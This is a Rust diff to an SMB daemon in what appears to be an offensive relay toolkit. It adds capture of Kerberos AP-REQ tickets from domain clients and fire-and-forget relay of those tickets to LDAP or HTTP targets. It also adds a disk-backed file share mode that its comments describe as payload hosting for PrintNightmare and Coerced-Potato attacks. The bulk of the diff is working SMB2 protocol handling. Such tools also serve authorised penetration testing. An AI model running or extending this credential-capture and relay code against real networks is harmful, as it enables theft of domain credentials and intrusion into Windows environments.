@@ -11,6 +11,7 @@
 //! - **Capture**: extract Net-NTLMv2 hashes from Session Setup
 //! - **Relay**: forward authenticated session to a target for DCE/RPC relay
 
+use crate::krb_capture::CapturedKerberosTicket;
 use crate::responder::CapturedCredential;
 use crate::{RelayError, Result};
 use aes::Aes128;
@@ -18,9 +19,10 @@ use cmac::Cmac;
 use hmac::{Hmac, Mac};
 use sha2::{Digest, Sha256, Sha512};
 use std::net::SocketAddr;
-use std::sync::atomic::{AtomicBool, Ordering};
+use std::path::{Path, PathBuf};
+use std::sync::atomic::{AtomicBool, AtomicU16, Ordering};
 use std::sync::{Arc, Mutex};
-use std::time::Duration;
+use std::time::{Duration, SystemTime, UNIX_EPOCH};
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::{TcpListener, TcpStream};
 use tracing::{debug, info, warn};
@@ -63,13 +65,55 @@ const STATUS_LOGON_FAILURE: u32 = 0xC000_006D;
 const STATUS_OBJECT_NAME_NOT_FOUND: u32 = 0xC000_0034;
 const STATUS_INVALID_PARAMETER: u32 = 0xC000_000D;
 const STATUS_NOT_SUPPORTED: u32 = 0xC000_00BB;
+const STATUS_OBJECT_NAME_COLLISION: u32 = 0xC000_0035;
+const STATUS_ACCESS_DENIED: u32 = 0xC000_0022;
 
 const FSCTL_PIPE_TRANSCEIVE: u32 = 0x0011_C017;
 
 const SHARE_TYPE_PIPE: u8 = 0x02;
+const SHARE_TYPE_DISK: u8 = 0x01;
 
 const OPLOCK_LEVEL_NONE: u8 = 0x00;
 const FILE_OPEN: u32 = 0x0001;
+
+// SMB2 Create dispositions (MS-SMB2 2.2.13)
+const FILE_SUPERSEDE: u32 = 0x0000_0000;
+// FILE_OPEN is defined above (0x0000_0001)
+const FILE_CREATE: u32 = 0x0000_0002;
+const FILE_OPEN_IF: u32 = 0x0000_0003;
+const FILE_OVERWRITE: u32 = 0x0000_0004;
+const FILE_OVERWRITE_IF: u32 = 0x0000_0005;
+
+// SMB2 Create options
+const FILE_DIRECTORY_FILE: u32 = 0x0000_0001;
+
+// SMB2 Create desired-access bits used by the file share
+const FILE_READ_DATA: u32 = 0x0000_0001;
+const FILE_WRITE_DATA: u32 = 0x0000_0002;
+
+// SMB2 QUERY_DIRECTORY FileInformationClass values (MS-SMB2 2.2.33)
+const FILE_DIRECTORY_INFORMATION_CLASS: u8 = 0x01;
+
+// SMB2 QUERY_DIRECTORY request flags
+const QUERY_DIRECTORY_RETURN_SINGLE_ENTRY: u8 = 0x02;
+
+// File attributes (MS-FSCC 2.6)
+const FILE_ATTRIBUTE_NORMAL: u32 = 0x0000_0080;
+const FILE_ATTRIBUTE_DIRECTORY: u32 = 0x0000_0010;
+
+// Windows FILETIME epoch: 100ns intervals since 1601-01-01
+const FILETIME_EPOCH_DIFF_SECS: u64 = 11_644_473_600;
+
+/// Convert SystemTime to Windows FILETIME (100ns units since 1601-01-01).
+fn systemtime_to_filetime(t: SystemTime) -> u64 {
+    match t.duration_since(UNIX_EPOCH) {
+        Ok(d) => {
+            let intervals = d.as_nanos() as u64 / 100;
+            (FILETIME_EPOCH_DIFF_SECS * 10_000_000).saturating_add(intervals)
+        }
+        Err(_) => 0,
+    }
+}
 
 /// Safely read a u16 from a byte slice at the given offset.
 /// Returns None if the slice is too short.
@@ -103,6 +147,13 @@ pub enum SmbDaemonMode {
         target_host: String,
         target_port: u16,
     },
+    /// Impacket smbserver.py parity: serve a local directory as an SMB2 file
+    /// share (payload hosting for PrintNightmare / Coerced-Potato style
+    /// attacks). Any tree connect maps onto `share_root`.
+    FileShare {
+        share_name: String,
+        share_root: PathBuf,
+    },
 }
 
 #[derive(Debug, Clone)]
@@ -114,6 +165,14 @@ pub struct SmbDaemonConfig {
     pub domain_name: String,
     /// Optional SOCKS5 proxy for outbound relay connections (format: `host:port`).
     pub socks5_proxy: Option<String>,
+    /// krbrelayx parity: advertise the krb5 SASL mech in session setup and
+    /// capture AP-REQ tickets handed over by domain clients. Captured tickets
+    /// are retrievable via [`SmbDaemon::get_captured_tickets`].
+    pub capture_kerberos: bool,
+    /// krbrelayx `--relay` parity: when set, every captured AP-REQ is
+    /// forwarded to this target (ldap/ldaps/http/https only) as SASL
+    /// GSS-SPNEGO. See [`crate::krb_relay::relay_kerberos`].
+    pub krb_relay_target: Option<crate::RelayTarget>,
 }
 
 impl Default for SmbDaemonConfig {
@@ -125,6 +184,8 @@ impl Default for SmbDaemonConfig {
             mode: SmbDaemonMode::Capture,
             domain_name: "LAN".into(),
             socks5_proxy: None,
+            capture_kerberos: false,
+            krb_relay_target: None,
         }
     }
 }
@@ -136,6 +197,10 @@ impl Default for SmbDaemonConfig {
 struct SmbFile {
     persistent_id: u64,
     write_data: Vec<u8>,
+    /// Disk-backed file (FileShare mode): resolved local path.
+    path: Option<PathBuf>,
+    /// Opened for writing; `write_data` is flushed to `path` on close.
+    for_write: bool,
 }
 
 /// Relay-side SMB2 connection state
@@ -164,6 +229,9 @@ struct SmbClientSession {
     client_negotiate_req: Vec<u8>,
     relay_session: Option<SmbRelaySession>,
     signing_key: Option<Vec<u8>>,
+    /// When the daemon runs in FileShare mode, the local directory backing
+    /// every tree connect. Set once per connection from `SmbDaemonMode`.
+    file_share_root: Option<PathBuf>,
 }
 
 impl SmbClientSession {
@@ -185,6 +253,7 @@ impl SmbClientSession {
             client_negotiate_req: Vec::new(),
             relay_session: None,
             signing_key: None,
+            file_share_root: None,
         }
     }
 }
@@ -197,6 +266,10 @@ pub struct SmbDaemon {
     config: SmbDaemonConfig,
     running: Arc<AtomicBool>,
     captured: Arc<Mutex<Vec<CapturedCredential>>>,
+    /// AP-REQ tickets captured when `capture_kerberos` is enabled
+    captured_tickets: Arc<Mutex<Vec<CapturedKerberosTicket>>>,
+    /// Actual bound TCP port (resolves ephemeral port 0 binds, used by tests).
+    bound_port: Arc<AtomicU16>,
 }
 
 impl SmbDaemon {
@@ -205,7 +278,30 @@ impl SmbDaemon {
             config,
             running: Arc::new(AtomicBool::new(false)),
             captured: Arc::new(Mutex::new(Vec::new())),
+            captured_tickets: Arc::new(Mutex::new(Vec::new())),
+            bound_port: Arc::new(AtomicU16::new(0)),
         }
+    }
+
+    /// All NTLM credentials captured so far (alias kept for readability).
+    pub fn get_captured(&self) -> Vec<CapturedCredential> {
+        self.get_captured_credentials()
+    }
+
+    /// All Kerberos AP-REQ tickets captured so far (krbrelayx parity).
+    pub fn get_captured_tickets(&self) -> Vec<CapturedKerberosTicket> {
+        self.captured_tickets
+            .lock()
+            .unwrap_or_else(|e| {
+                warn!("Mutex poisoned in SMBDaemon tickets");
+                e.into_inner()
+            })
+            .clone()
+    }
+
+    /// The port the listener actually bound (0 until `start()` succeeds).
+    pub fn bound_port(&self) -> u16 {
+        self.bound_port.load(Ordering::SeqCst)
     }
 
     pub async fn start(&mut self) -> Result<()> {
@@ -216,16 +312,20 @@ impl SmbDaemon {
         let listener = TcpListener::bind(&addr)
             .await
             .map_err(|e| RelayError::Socket(format!("Failed to bind SMB port {}: {}", addr, e)))?;
+        if let Ok(local) = listener.local_addr() {
+            self.bound_port.store(local.port(), Ordering::SeqCst);
+        }
         self.running.store(true, Ordering::SeqCst);
         let running = self.running.clone();
         let config = self.config.clone();
         let captured = self.captured.clone();
+        let captured_tickets = self.captured_tickets.clone();
         info!(
-            "SMBDaemon listening on {}:{} (mode: {:?})",
-            config.listen_ip, config.listen_port, config.mode
+            "SMBDaemon listening on {}:{} (mode: {:?}, kerberos capture: {})",
+            config.listen_ip, config.listen_port, config.mode, config.capture_kerberos
         );
         tokio::spawn(async move {
-            Self::accept_loop(listener, running, config, captured).await;
+            Self::accept_loop(listener, running, config, captured, captured_tickets).await;
         });
         Ok(())
     }
@@ -257,6 +357,7 @@ impl SmbDaemon {
         running: Arc<AtomicBool>,
         config: SmbDaemonConfig,
         captured: Arc<Mutex<Vec<CapturedCredential>>>,
+        captured_tickets: Arc<Mutex<Vec<CapturedKerberosTicket>>>,
     ) {
         while running.load(Ordering::SeqCst) {
             match listener.accept().await {
@@ -264,9 +365,12 @@ impl SmbDaemon {
                     debug!("SMB connection from {}", peer);
                     let config = config.clone();
                     let captured = captured.clone();
+                    let captured_tickets = captured_tickets.clone();
                     let running = running.clone();
                     tokio::spawn(async move {
-                        if let Err(e) = Self::handle_client(stream, config, captured, running).await
+                        if let Err(e) =
+                            Self::handle_client(stream, config, captured, captured_tickets, running)
+                                .await
                         {
                             debug!("SMB client handler error: {}", e);
                         }
@@ -287,6 +391,7 @@ impl SmbDaemon {
         mut stream: TcpStream,
         config: SmbDaemonConfig,
         captured: Arc<Mutex<Vec<CapturedCredential>>>,
+        captured_tickets: Arc<Mutex<Vec<CapturedKerberosTicket>>>,
         running: Arc<AtomicBool>,
     ) -> Result<()> {
         let peer_addr = stream
@@ -297,6 +402,9 @@ impl SmbDaemon {
         let mut session = SmbClientSession::new();
         if let Some(ch) = config.challenge {
             session.ntlm_challenge = ch;
+        }
+        if let SmbDaemonMode::FileShare { share_root, .. } = &config.mode {
+            session.file_share_root = Some(share_root.clone());
         }
 
         let mut buf = vec![0u8; 65536];
@@ -356,6 +464,7 @@ impl SmbDaemon {
                         &mut session,
                         &config,
                         &captured,
+                        &captured_tickets,
                         &peer_addr,
                     )
                     .await
@@ -370,7 +479,9 @@ impl SmbDaemon {
                 SMB2_WRITE => Self::handle_write(&data[smb2_start..], &mut session),
                 SMB2_IOCTL => Self::handle_ioctl(&data[smb2_start..], &mut session).await,
                 SMB2_LOGOFF => Self::handle_logoff(&mut session),
-                SMB2_QUERY_DIRECTORY => (STATUS_OBJECT_NAME_NOT_FOUND, vec![]),
+                SMB2_QUERY_DIRECTORY => {
+                    Self::handle_query_directory(&data[smb2_start..], &mut session).await
+                }
                 _ => (STATUS_NOT_SUPPORTED, vec![]),
             };
 
@@ -600,6 +711,7 @@ impl SmbDaemon {
         session: &mut SmbClientSession,
         config: &SmbDaemonConfig,
         captured: &Arc<Mutex<Vec<CapturedCredential>>>,
+        captured_tickets: &Arc<Mutex<Vec<CapturedKerberosTicket>>>,
         peer_addr: &str,
     ) -> (u32, Vec<u8>) {
         let body = &data[SMB2_HEADER_SIZE..];
@@ -615,6 +727,37 @@ impl SmbDaemon {
 
         let sec_data = &data[sec_buf_offset..sec_buf_offset + sec_buf_len];
         let ntlmssp = Self::extract_ntlmssp(sec_data);
+
+        // krbrelayx parity: no NTLM blob in the buffer -- try to treat it as
+        // a Kerberos AP-REQ (client followed the krb5 mech negotiation).
+        if ntlmssp.is_empty() && config.capture_kerberos {
+            let peer_ip = peer_addr.split(':').next().unwrap_or(peer_addr);
+            return match Self::capture_kerberos_apreq(sec_data, captured_tickets, peer_ip) {
+                Some(()) => {
+                    // krbrelayx --relay parity: forward the captured AP-REQ
+                    // to the configured target (fire-and-forget one-shot; the
+                    // SMB session-setup response is returned immediately).
+                    if let Some(target) = config.krb_relay_target.clone() {
+                        let blob = sec_data.to_vec();
+                        tokio::spawn(async move {
+                            let outcome = crate::krb_relay::relay_kerberos(
+                                &target,
+                                &blob,
+                                Duration::from_secs(15),
+                            )
+                            .await;
+                            if outcome.is_success() {
+                                info!("Kerberos relay: {}", outcome.summary());
+                            } else {
+                                warn!("Kerberos relay: {}", outcome.summary());
+                            }
+                        });
+                    }
+                    (STATUS_SUCCESS, vec![0x04, 0x00])
+                }
+                None => (STATUS_LOGON_FAILURE, vec![]),
+            };
+        }
         if ntlmssp.is_empty() {
             return (STATUS_LOGON_FAILURE, vec![]);
         }
@@ -666,11 +809,18 @@ impl SmbDaemon {
                     }
                 }
 
-                // Capture mode: send our own challenge
-                debug!("NTLMSSP Type 1 -> sending challenge");
-                let challenge =
-                    Self::build_ntlm_challenge(session.ntlm_challenge, &config.domain_name);
-                let spnego = Self::wrap_spnego_response(&challenge);
+                // Capture mode: send our own challenge -- or, in krbrelayx
+                // capture mode, redirect the client to the Kerberos mech and
+                // wait for the AP-REQ in the next leg.
+                let spnego = if config.capture_kerberos {
+                    debug!("Type 1 -> advertising krb5 mech (kerberos capture)");
+                    crate::krb_capture::build_krb5_spnego_challenge()
+                } else {
+                    debug!("NTLMSSP Type 1 -> sending challenge");
+                    let challenge =
+                        Self::build_ntlm_challenge(session.ntlm_challenge, &config.domain_name);
+                    Self::wrap_spnego_response(&challenge)
+                };
                 let mut resp = Vec::with_capacity(32);
                 resp.extend_from_slice(&9u16.to_le_bytes());
                 resp.push(0x00);
@@ -756,6 +906,23 @@ impl SmbDaemon {
             return Self::relay_tree_connect(relay, &path).await;
         }
 
+        // FileShare mode: any share maps onto the backing directory
+        if session.file_share_root.is_some() {
+            debug!(
+                "FileShare: tree connect to {} -> {:?}",
+                path, session.file_share_root
+            );
+            session.tree_id = rand::random::<u32>() & 0x0000_FFFF;
+            let mut resp = Vec::with_capacity(16);
+            resp.extend_from_slice(&16u16.to_le_bytes());
+            resp.push(SHARE_TYPE_DISK);
+            resp.push(0x00);
+            resp.extend_from_slice(&0u32.to_le_bytes());
+            resp.extend_from_slice(&0u32.to_le_bytes());
+            resp.extend_from_slice(&0x001F_01FFu32.to_le_bytes());
+            return (STATUS_SUCCESS, resp);
+        }
+
         // Capture mode: only IPC$
         if path.contains("IPC$") || path.contains("ipc$") {
             session.tree_id = rand::random::<u32>() & 0x0000_FFFF;
@@ -782,6 +949,14 @@ impl SmbDaemon {
         let body = &data[SMB2_HEADER_SIZE..];
         if body.len() < 64 {
             return (STATUS_INVALID_PARAMETER, vec![]);
+        }
+
+        // FileShare mode: resolve the requested name against the backing
+        // directory (own MS-SMB2-correct parsing, independent of the legacy
+        // pipe-name offsets below).
+        if session.file_share_root.is_some() {
+            let root = session.file_share_root.clone().unwrap_or_default();
+            return Self::file_share_create(data, &root, session);
         }
 
         let name_off = u16::from_le_bytes([body[36], body[37]]) as usize;
@@ -814,6 +989,8 @@ impl SmbDaemon {
         session.open_files.push(SmbFile {
             persistent_id,
             write_data: Vec::new(),
+            path: None,
+            for_write: false,
         });
 
         let mut resp = Vec::with_capacity(128);
@@ -836,13 +1013,44 @@ impl SmbDaemon {
         if body.len() < 24 {
             return (STATUS_INVALID_PARAMETER, vec![]);
         }
-        let persistent_id = match read_u64_le(body, 16) {
+        let persistent_id = match read_u64_le(body, 8) {
             Some(id) => id,
             None => return (STATUS_INVALID_PARAMETER, vec![]),
         };
-        session
-            .open_files
-            .retain(|f| f.persistent_id != persistent_id);
+        // Flush disk-backed files opened for writing (FileShare mode)
+        let mut flush: Option<(PathBuf, Vec<u8>)> = None;
+        session.open_files.retain(|f| {
+            if f.persistent_id != persistent_id {
+                return true;
+            }
+            if f.for_write
+                && let Some(p) = &f.path
+            {
+                flush = Some((p.clone(), f.write_data.clone()));
+            }
+            false
+        });
+        if let Some((path, contents)) = flush {
+            if let Some(parent) = path.parent().filter(|p| !p.as_os_str().is_empty()) {
+                let _ = std::fs::create_dir_all(parent);
+            }
+            return match std::fs::write(&path, &contents) {
+                Ok(()) => {
+                    info!(
+                        "FileShare: wrote {} bytes to {}",
+                        contents.len(),
+                        path.display()
+                    );
+                    let mut resp = vec![0u8; 60];
+                    resp[0..2].copy_from_slice(&60u16.to_le_bytes());
+                    (STATUS_SUCCESS, resp)
+                }
+                Err(e) => {
+                    warn!("FileShare: write to {} failed: {}", path.display(), e);
+                    (STATUS_ACCESS_DENIED, vec![])
+                }
+            };
+        }
         let mut resp = vec![0u8; 60];
         resp[0..2].copy_from_slice(&60u16.to_le_bytes());
         (STATUS_SUCCESS, resp)
@@ -861,6 +1069,16 @@ impl SmbDaemon {
             Some(id) => id,
             None => return (STATUS_INVALID_PARAMETER, vec![]),
         };
+        // FileShare mode: serve from disk at the requested offset
+        if let Some(path) = session
+            .open_files
+            .iter()
+            .find(|f| f.persistent_id == persistent_id)
+            .and_then(|f| f.path.clone())
+        {
+            let offset = read_u64_le(body, 8).unwrap_or(0);
+            return Self::file_share_read(&path, offset, read_len);
+        }
         let data_buf = session
             .open_files
             .iter()
@@ -903,7 +1121,19 @@ impl SmbDaemon {
                 .iter_mut()
                 .find(|f| f.persistent_id == persistent_id)
             {
-                file.write_data = wdata;
+                if file.path.is_some() {
+                    // FileShare mode: merge into the in-memory image at the
+                    // requested offset; flushed to disk on close.
+                    let write_offset = read_u64_le(body, 8).unwrap_or(0) as usize;
+                    let end = write_offset.saturating_add(wdata.len());
+                    if file.write_data.len() < end {
+                        file.write_data.resize(end, 0);
+                    }
+                    file.write_data[write_offset..end].copy_from_slice(&wdata);
+                    file.for_write = true;
+                } else {
+                    file.write_data = wdata;
+                }
             }
         }
         let mut resp = Vec::with_capacity(32);
@@ -990,6 +1220,359 @@ impl SmbDaemon {
         session.tree_id = 0;
         session.open_files.clear();
         (STATUS_SUCCESS, vec![0x04, 0x00])
+    }
+
+    // ===========================================================
+    // FileShare mode: local directory backing store (smbserver parity)
+    // ===========================================================
+
+    /// Handle SMB2 Create against the share's backing directory.
+    ///
+    /// Parses the CREATE request per MS-SMB2 2.2.13 (fixed body = 56 bytes):
+    /// DesiredAccess at body 24, CreateDisposition at 36, CreateOptions at
+    /// 40; NameOffset/NameLength fields at body 44/46 with the values being
+    /// absolute from the SMB2 header start.
+    fn file_share_create(
+        data: &[u8],
+        root: &Path,
+        session: &mut SmbClientSession,
+    ) -> (u32, Vec<u8>) {
+        let body = &data[SMB2_HEADER_SIZE..];
+        if body.len() < 56 {
+            return (STATUS_INVALID_PARAMETER, vec![]);
+        }
+        let name_off = match read_u16_le(body, 44) {
+            Some(v) => v as usize,
+            None => return (STATUS_INVALID_PARAMETER, vec![]),
+        };
+        let name_len = match read_u16_le(body, 46) {
+            Some(v) => v as usize,
+            None => return (STATUS_INVALID_PARAMETER, vec![]),
+        };
+        if name_off + name_len > data.len() {
+            return (STATUS_INVALID_PARAMETER, vec![]);
+        }
+        let name = if name_len == 0 {
+            String::new()
+        } else {
+            String::from_utf16_lossy(
+                &data[name_off..name_off + name_len]
+                    .chunks(2)
+                    .map(|c| u16::from_le_bytes([c[0], c[1]]))
+                    .collect::<Vec<_>>(),
+            )
+        };
+
+        let disposition = read_u32_le(body, 36).unwrap_or(FILE_OPEN);
+        let create_options = read_u32_le(body, 40).unwrap_or(0);
+        let desired_access = read_u32_le(body, 24).unwrap_or(FILE_READ_DATA);
+
+        // Empty name = the share root directory itself
+        let is_dir_open = create_options & FILE_DIRECTORY_FILE != 0 || name.is_empty();
+        let resolved = match Self::resolve_share_path(root, &name) {
+            Some(p) => p,
+            None => {
+                warn!("FileShare: rejected path traversal attempt: {:?}", name);
+                return (STATUS_ACCESS_DENIED, vec![]);
+            }
+        };
+
+        let mut create_action = 1u32; // FILE_OPENED
+        if is_dir_open {
+            let exists = resolved.is_dir();
+            match disposition {
+                FILE_CREATE if exists => return (STATUS_OBJECT_NAME_COLLISION, vec![]),
+                FILE_OPEN if !exists => return (STATUS_OBJECT_NAME_NOT_FOUND, vec![]),
+                FILE_OVERWRITE | FILE_SUPERSEDE if !exists => {
+                    return (STATUS_OBJECT_NAME_NOT_FOUND, vec![]);
+                }
+                FILE_CREATE | FILE_OPEN_IF | FILE_OVERWRITE_IF if !exists => {
+                    if let Err(e) = std::fs::create_dir_all(&resolved) {
+                        debug!("FileShare: mkdir failed: {}", e);
+                        return (STATUS_ACCESS_DENIED, vec![]);
+                    }
+                    create_action = 2; // FILE_CREATED
+                }
+                _ => {}
+            }
+        } else {
+            let exists = resolved.is_file();
+            match disposition {
+                FILE_OPEN if !exists => return (STATUS_OBJECT_NAME_NOT_FOUND, vec![]),
+                FILE_CREATE if exists => return (STATUS_OBJECT_NAME_COLLISION, vec![]),
+                FILE_OVERWRITE | FILE_SUPERSEDE if !exists => {
+                    return (STATUS_OBJECT_NAME_NOT_FOUND, vec![]);
+                }
+                FILE_CREATE | FILE_OPEN_IF | FILE_OVERWRITE_IF => {
+                    if !exists {
+                        if let Some(parent) =
+                            resolved.parent().filter(|p| !p.as_os_str().is_empty())
+                        {
+                            let _ = std::fs::create_dir_all(parent);
+                        }
+                        if let Err(e) = std::fs::File::create(&resolved) {
+                            debug!("FileShare: file create failed: {}", e);
+                            return (STATUS_ACCESS_DENIED, vec![]);
+                        }
+                        create_action = 2; // FILE_CREATED
+                    } else if disposition == FILE_OVERWRITE || disposition == FILE_SUPERSEDE {
+                        let _ = std::fs::write(&resolved, b"");
+                    }
+                }
+                _ => {}
+            }
+        }
+
+        // Register the open file
+        let persistent_id = rand::random::<u64>();
+        let for_write = desired_access & FILE_WRITE_DATA != 0
+            || matches!(
+                disposition,
+                FILE_CREATE | FILE_OPEN_IF | FILE_OVERWRITE | FILE_OVERWRITE_IF | FILE_SUPERSEDE
+            );
+        let (ctime, atime, wtime) = Self::file_times(&resolved);
+        let size = std::fs::metadata(&resolved)
+            .map(|m| if m.is_file() { m.len() } else { 0 })
+            .unwrap_or(0);
+        let attributes = if std::fs::metadata(&resolved)
+            .map(|m| m.is_dir())
+            .unwrap_or(false)
+        {
+            FILE_ATTRIBUTE_DIRECTORY
+        } else {
+            FILE_ATTRIBUTE_NORMAL
+        };
+        session.open_files.push(SmbFile {
+            persistent_id,
+            write_data: Vec::new(),
+            path: Some(resolved),
+            for_write,
+        });
+
+        let mut resp = Vec::with_capacity(120);
+        resp.extend_from_slice(&89u16.to_le_bytes());
+        resp.push(OPLOCK_LEVEL_NONE);
+        resp.push(0x00);
+        resp.extend_from_slice(&create_action.to_le_bytes());
+        resp.extend_from_slice(&ctime.to_le_bytes());
+        resp.extend_from_slice(&atime.to_le_bytes());
+        resp.extend_from_slice(&wtime.to_le_bytes());
+        resp.extend_from_slice(&wtime.to_le_bytes()); // ChangeTime
+        resp.extend_from_slice(&0u64.to_le_bytes()); // AllocationSize
+        resp.extend_from_slice(&size.to_le_bytes()); // EndOfFile
+        resp.extend_from_slice(&attributes.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes()); // Reserved
+        resp.extend_from_slice(&persistent_id.to_le_bytes());
+        let volatile_id = rand::random::<u64>();
+        resp.extend_from_slice(&volatile_id.to_le_bytes());
+        resp.extend_from_slice(&0u32.to_le_bytes()); // CreateContextsOffset
+        resp.extend_from_slice(&0u32.to_le_bytes()); // CreateContextsLength
+        debug!("FileShare: opened {:?} (id {})", name, persistent_id);
+        (STATUS_SUCCESS, resp)
+    }
+
+    /// Handle SMB2 Read against a disk-backed open file.
+    fn file_share_read(path: &Path, offset: u64, read_len: u32) -> (u32, Vec<u8>) {
+        let contents = match std::fs::read(path) {
+            Ok(c) => c,
+            Err(e) => {
+                debug!("FileShare: read {} failed: {}", path.display(), e);
+                return (STATUS_OBJECT_NAME_NOT_FOUND, vec![]);
+            }
+        };
+        let start = offset.min(contents.len() as u64) as usize;
+        let end = start.saturating_add(read_len as usize).min(contents.len());
+        let chunk = &contents[start..end];
+        let mut resp = Vec::with_capacity(16 + chunk.len());
+        resp.extend_from_slice(&17u16.to_le_bytes()); // StructureSize
+        resp.push(80u8); // DataOffset (header 64 + body 16)
+        resp.push(0u8); // Reserved
+        resp.extend_from_slice(&(chunk.len() as u32).to_le_bytes()); // DataLength
+        resp.extend_from_slice(&0u32.to_le_bytes()); // DataRemaining
+        resp.extend_from_slice(&0u32.to_le_bytes()); // Reserved2
+        resp.extend_from_slice(chunk);
+        (STATUS_SUCCESS, resp)
+    }
+
+    /// Handle SMB2 QUERY_DIRECTORY (0x000E). Only FileDirectoryInformation
+    /// (class 0x01) is produced; any file share backing store is listed with
+    /// an RFC-style `*`/`?` glob over the share root.
+    async fn handle_query_directory(data: &[u8], session: &mut SmbClientSession) -> (u32, Vec<u8>) {
+        let body = &data[SMB2_HEADER_SIZE..];
+        if body.len() < 32 {
+            return (STATUS_INVALID_PARAMETER, vec![]);
+        }
+        let Some(root) = session.file_share_root.clone() else {
+            // Legacy behavior for capture/relay modes
+            return (STATUS_OBJECT_NAME_NOT_FOUND, vec![]);
+        };
+
+        let info_class = body[2];
+        let flags = body[3];
+        if info_class != FILE_DIRECTORY_INFORMATION_CLASS {
+            debug!(
+                "FileShare: unsupported QUERY_DIRECTORY class {}",
+                info_class
+            );
+            return (STATUS_NOT_SUPPORTED, vec![]);
+        }
+
+        let name_off = read_u16_le(body, 28).unwrap_or(0) as usize;
+        let name_len = read_u16_le(body, 30).unwrap_or(0) as usize;
+        let pattern = if name_off + name_len <= data.len() && name_len > 0 {
+            String::from_utf16_lossy(
+                &data[name_off..name_off + name_len]
+                    .chunks(2)
+                    .map(|c| u16::from_le_bytes([c[0], c[1]]))
+                    .collect::<Vec<_>>(),
+            )
+        } else {
+            "*".to_string()
+        };
+
+        let mut names: Vec<(String, bool, u64)> = Vec::new();
+        let entries = match std::fs::read_dir(&root) {
+            Ok(rd) => rd,
+            Err(e) => {
+                debug!("FileShare: read_dir {} failed: {}", root.display(), e);
+                return (STATUS_OBJECT_NAME_NOT_FOUND, vec![]);
+            }
+        };
+        for entry in entries.flatten() {
+            let fname = entry.file_name().to_string_lossy().to_string();
+            if !Self::glob_match(&pattern, &fname) {
+                continue;
+            }
+            let is_dir = entry.file_type().map(|t| t.is_dir()).unwrap_or(false);
+            let size = entry
+                .metadata()
+                .map(|m| if m.is_file() { m.len() } else { 0 })
+                .unwrap_or(0);
+            names.push((fname, is_dir, size));
+            if flags & QUERY_DIRECTORY_RETURN_SINGLE_ENTRY != 0 && !names.is_empty() {
+                break;
+            }
+        }
+        names.sort_by(|a, b| a.0.cmp(&b.0));
+
+        // Build FILE_DIRECTORY_INFORMATION entries (MS-FSCC 2.4.10)
+        let mut buf: Vec<u8> = Vec::with_capacity(names.len() * 80);
+        for (i, (fname, is_dir, size)) in names.iter().enumerate() {
+            let name_u16: Vec<u8> = fname.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
+            let fixed = 64 + 4;
+            let entry_len = fixed + name_u16.len();
+            let padded = (entry_len + 7) & !7;
+            let next = if i + 1 == names.len() {
+                0u32
+            } else {
+                padded as u32
+            };
+
+            buf.extend_from_slice(&next.to_le_bytes());
+            buf.extend_from_slice(&0u32.to_le_bytes()); // FileIndex
+            let (ctime, atime, wtime) = Self::file_times_for(&root.join(fname));
+            buf.extend_from_slice(&ctime.to_le_bytes());
+            buf.extend_from_slice(&atime.to_le_bytes());
+            buf.extend_from_slice(&wtime.to_le_bytes());
+            buf.extend_from_slice(&wtime.to_le_bytes()); // ChangeTime
+            buf.extend_from_slice(&size.to_le_bytes()); // EndOfFile
+            buf.extend_from_slice(&size.to_le_bytes()); // AllocationSize
+            let attrs = if *is_dir {
+                FILE_ATTRIBUTE_DIRECTORY
+            } else {
+                FILE_ATTRIBUTE_NORMAL
+            };
+            buf.extend_from_slice(&attrs.to_le_bytes());
+            buf.extend_from_slice(&(name_u16.len() as u32).to_le_bytes()); // FileNameLength
+            buf.extend_from_slice(&name_u16);
+            while !buf.len().is_multiple_of(8) {
+                buf.push(0);
+            }
+        }
+
+        if buf.is_empty() {
+            return (STATUS_OBJECT_NAME_NOT_FOUND, vec![]);
+        }
+
+        // Response: StructureSize(9), OutputBufferOffset(u16),
+        // OutputBufferLength(u32), then the buffer.
+        let out_off = (SMB2_HEADER_SIZE + 8) as u16;
+        let mut resp = Vec::with_capacity(8 + buf.len());
+        resp.extend_from_slice(&9u16.to_le_bytes());
+        resp.extend_from_slice(&out_off.to_le_bytes());
+        resp.extend_from_slice(&(buf.len() as u32).to_le_bytes());
+        resp.extend_from_slice(&buf);
+        (STATUS_SUCCESS, resp)
+    }
+
+    /// Convert a share-relative name into a safe local path. Rejects absolute
+    /// paths, drive/UNC separators, and `..` traversal components.
+    fn resolve_share_path(root: &Path, name: &str) -> Option<PathBuf> {
+        let trimmed = name.trim_start_matches('\\').trim_start_matches('/');
+        if trimmed.contains(':') || trimmed.starts_with('\\') || trimmed.starts_with('/') {
+            return None;
+        }
+        let mut out = root.to_path_buf();
+        for comp in trimmed.split(['\\', '/']) {
+            if comp.is_empty() {
+                continue;
+            }
+            if comp == ".." || comp == "." {
+                return None;
+            }
+            out.push(comp);
+        }
+        Some(out)
+    }
+
+    /// Case-insensitive glob with `*` and `?` wildcards.
+    fn glob_match(pattern: &str, name: &str) -> bool {
+        let p: Vec<char> = pattern.to_lowercase().chars().collect();
+        let n: Vec<char> = name.to_lowercase().chars().collect();
+        let (mut pi, mut ni) = (0usize, 0usize);
+        let (mut star_p, mut star_n) = (usize::MAX, 0usize);
+        while ni < n.len() {
+            if pi < p.len() && (p[pi] == '?' || p[pi] == n[ni]) {
+                pi += 1;
+                ni += 1;
+            } else if pi < p.len() && p[pi] == '*' {
+                star_p = pi;
+                star_n = ni;
+                pi += 1;
+            } else if star_p != usize::MAX {
+                pi = star_p + 1;
+                star_n += 1;
+                ni = star_n;
+            } else {
+                return false;
+            }
+        }
+        while pi < p.len() && p[pi] == '*' {
+            pi += 1;
+        }
+        pi == p.len()
+    }
+
+    /// FILETIME triple (creation, access, write) for a path; zeros when
+    /// metadata is unavailable.
+    fn file_times(path: &Path) -> (u64, u64, u64) {
+        Self::file_times_for(path)
+    }
+
+    fn file_times_for(path: &Path) -> (u64, u64, u64) {
+        match std::fs::metadata(path).map(|m| {
+            let created = m.created().unwrap_or(UNIX_EPOCH);
+            let accessed = m.accessed().unwrap_or(UNIX_EPOCH);
+            let modified = m.modified().unwrap_or(UNIX_EPOCH);
+            (created, accessed, modified)
+        }) {
+            Ok((c, a, m)) => (
+                systemtime_to_filetime(c),
+                systemtime_to_filetime(a),
+                systemtime_to_filetime(m),
+            ),
+            Err(_) => (0, 0, 0),
+        }
     }
 
     // ===========================================================
@@ -1452,7 +2035,7 @@ impl SmbDaemon {
         body[3] = 0; // Reserved
         body[4..8].copy_from_slice(&ctl_code.to_le_bytes());
